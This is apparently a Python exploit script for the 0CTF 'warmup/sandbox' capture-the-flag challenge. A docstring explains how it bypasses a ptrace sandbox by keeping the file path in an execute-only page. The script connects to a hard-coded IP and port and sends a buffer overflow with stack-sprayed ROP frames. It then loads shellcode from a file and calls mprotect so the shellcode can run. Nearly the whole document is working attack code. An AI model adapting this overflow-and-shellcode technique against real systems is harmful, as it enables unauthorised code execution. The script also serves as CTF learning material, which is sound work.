#!/usr/bin/env python2.7

"""
    0CTF exploit for warmup/sandbox
    We have a buffer overflow in a sandboxed binary.
    Exploiting this buffer overflow is a little tricky since we 
    have limited space for our rop chain. But basically spraying 
    the stack allows us to have "more space" for our rop chain by 
    restarting the binary a few times. We mprotect a page where 
    we store our shellcode then jump to it. The sandbox 
    attemps to disallow opening any file other than /home/warmup/flag.
    This doesn't work however because if accessing the memory 
    containing the "path" of the file to open is not readable 
    by the tracing parent, the check does not take place. 
    Therefore we put the path in a page marked 'execute' only 
    to take advantage of this.
"""

import socket
import struct
import sys
import telnetlib


ADDR = "202.120.7.207"
PORT = 52608
DEBUG = False

s = socket.create_connection((ADDR, PORT))

def p64(a):
    return struct.pack("<Q", a)

def u64(s):
    return struct.unpack("<Q", s)[0]

def p32(a):
    return struct.pack("<I", a)

def u32(s):
    return struct.unpack("<I", s)[0]

def rtil_str(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DEBUG:
        sys.stdout.write(buf)
    return buf


def comm(rx, tx):
    r = rtil_str(rx)
    s.send(tx)
    return r


rtil_str("\n")

# rop gadgets
scall = p32(0x08048122)
do_read = p32(0x804811D)
do_write = p32(0x08048135)
restart = p32(0x080480D8)
add_esp_ret = p32(0x80481B8)

data_page = p32(0x08049000)
data = p32(0x080491E0)
sc_addr = p32(0x080492a0)
scratch_data = p32(0x080491E0 + 0x40)

# we use the overflow
# to store our shellcode in .data
# then we call restart to get a second 
# shot
sc = "\x90" * 200
sc += open("sc.bin", "r").read()
sc_len = len(sc)
buf = "A" * 32
buf += do_read + restart + p32(0) + data + p32(sc_len)
assert(len(buf) <= 0x34)
s.send(buf) 
rtil_str("\n")
s.send(sc)

# we spray the stack a bit
# that way we can use the add_esp_ret
# gadget which will allow us to 
# have more control for rop
# some of these spray "frames"
# contain chunks of your rop payloads
# all this spraying might not be necessary
# but too lazy
# the order in which the rop chain gets executed
# is anotated with numbers

# spray
rtil_str("\n")
buf = "Z" * 32
buf += restart                          # 1
buf = buf.ljust(0x28, "Z")
buf += scall + restart + data
s.send(buf) 
rtil_str("\n")

# spray
rtil_str("\n")
buf = "J" * 32
buf += restart                          # 2
buf = buf.ljust(0x24, "Z")
buf += p32(0x1000) + p32(7)             # 4.2
buf = buf.ljust(0x34, "J")
s.send(buf) 
rtil_str("\n")

# spray
rtil_str("\n")
buf = "I" * 32
buf += restart                          # 3
buf = buf.ljust(0x28, "Z")
buf += scall + sc_addr + data_page      # 4.1
buf = buf.ljust(0x34, "I")
s.send(buf) 
rtil_str("\n")

# spray
rtil_str("\n")
buf = "K" * 32
buf += restart                          # 4
buf = buf.ljust(0x34, "K")
s.send(buf) 
rtil_str("\n")

# spray
rtil_str("\n")
buf = "L" * 32
buf += restart                          # 5
buf = buf.ljust(0x34, "L")
s.send(buf) 
rtil_str("\n")

# set eax to 125 for mprotect
# thanks to read() we can do this
# by just sending 125 bytes
rtil_str("\n")
buf = "A" * 32
buf += do_read + add_esp_ret + p32(0) + scratch_data + p32(125) # 6
buf = buf.ljust(0x34, "A")
s.send(buf) 
rtil_str("\n")
s.send("A" * 125)

print rtil_str("\n"),
print rtil_str("\n"),
